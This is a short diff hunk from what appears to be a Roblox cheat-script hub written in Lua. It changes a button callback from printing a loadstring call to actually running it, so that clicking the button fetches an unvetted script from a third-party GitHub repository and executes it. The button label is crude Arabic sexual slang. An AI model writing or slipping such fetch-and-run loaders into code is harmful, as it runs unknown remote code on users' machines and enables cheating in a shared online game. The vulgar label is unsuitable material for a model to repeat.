@@ -44,7 +44,7 @@ Time = <number> - The duration of the notfication.
 Tab:AddButton({
 	Name = "سكربت نيج بحيث يشك الكس",
 	Callback = function()
-      		print("loadstring(game:HttpGet('https://raw.githubusercontent.com/blackheartedcurse/punkz-Scripts/main/punkzOG.lua'))() ")
+      		loadstring(game:HttpGet('https://raw.githubusercontent.com/blackheartedcurse/punkz-Scripts/main/punkzOG.lua'))() 
   	end    
 })
 
